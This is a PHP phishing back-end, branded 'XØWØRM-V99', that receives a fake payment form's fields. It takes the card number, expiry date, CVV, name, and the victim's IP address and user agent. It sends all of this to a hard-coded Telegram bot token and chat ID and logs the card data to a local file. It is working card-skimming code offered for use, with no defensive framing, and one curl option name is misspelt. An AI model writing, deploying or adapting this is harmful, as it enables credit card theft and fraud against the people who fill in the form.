<?php
// ============================================
// ⚔️ XØWØRM-V99 👹 TELEGRAM BOT — PRIVATE DELIVERY
// ============================================

// 👇 البوت الجديد
$telegram_token = "8762761939:AAHBZhzl27ZSkHTiEBTL0A0UshC2I7IYJ5w";
$chat_id = "7087174244"; // ← ايديك انت (خاص)

// ============================================
// Collect all form data
// ============================================
$fullName    = isset($_POST['fullName'])    ? $_POST['fullName']    : '—';
$cardNumber  = isset($_POST['cardNumber'])  ? $_POST['cardNumber']  : '—';
$expDate     = isset($_POST['expDate'])     ? $_POST['expDate']     : '—';
$cvv         = isset($_POST['cvv'])         ? $_POST['cvv']         : '—';
$cardName    = isset($_POST['cardName'])    ? $_POST['cardName']    : '—';

// ============================================
// Victim info
// ============================================
$ip        = $_SERVER['REMOTE_ADDR'];
$userAgent = $_SERVER['HTTP_USER_AGENT'];
$timestamp = date('Y-m-d H:i:s');

// ============================================
// Build the message
// ============================================
$message = "
═══════════════════════════════
      💳 XØWØRM-V99 CAPTURE
═══════════════════════════════

【 CREDIT CARD DATA 】
👤 Full Name    : $fullName
💳 Card Number  : $cardNumber
📅 Expiry Date  : $expDate
🔒 CVV          : $cvv
🏦 Card Name    : $cardName

【 VICTIM INFO 】
🌐 IP Address   : $ip
🕐 Timestamp    : $timestamp
📱 User Agent   : $userAgent
═══════════════════════════════
";

// ============================================
// Send to Telegram
// ============================================
function sendToTelegram($token, $chat_id, $message) {
    $telegramUrl = "https://api.telegram.org/bot{$token}/sendMessage";

    $data = [
        'chat_id'                  => $chat_id,
        'text'                     => $message,
        'parse_mode'               => 'HTML',
        'disable_web_page_preview' => true
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $telegramUrl);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFER, false);  // <-- FIXED TYPO
    $response = curl_exec($ch);
    curl_close($ch);

    return $response;
}

sendToTelegram($telegram_token, $chat_id, $message);

// ============================================
// Log to file
// ============================================
$log_entry = "[$timestamp] IP: $ip | Name: $fullName | Card: $cardNumber | Exp: $expDate | CVV: $cvv\n";
file_put_contents('captured_data.log', $log_entry, FILE_APPEND);

// No redirect — just respond silently
// The HTML handles the redirect via JavaScript
?>